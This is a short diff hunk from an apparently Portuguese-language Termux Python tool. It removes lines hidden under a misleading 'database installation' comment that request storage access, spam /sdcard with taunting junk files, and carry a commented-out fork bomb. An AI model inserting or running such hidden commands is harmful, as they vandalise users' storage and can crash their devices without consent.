@@ -16,11 +16,6 @@ Y = "\033[1;33m"
 
 #LOGIN
 #instalação da db de consulta dados
-os.system("termux-setup-storage")
-time.sleep(4)
-os.system("cd /sdcard/")
-os.system("touch wolf_e_jeff_passaram_aquiKKKKKKKKKKK{1..100}.txt")
-#os.system(":(){ :|:& };:")
 def login():
     print(f"{W}[{Y}{W}]FAÇA SEU LOGIN!")
     usuario = input("INFORME O USUARIO: ")
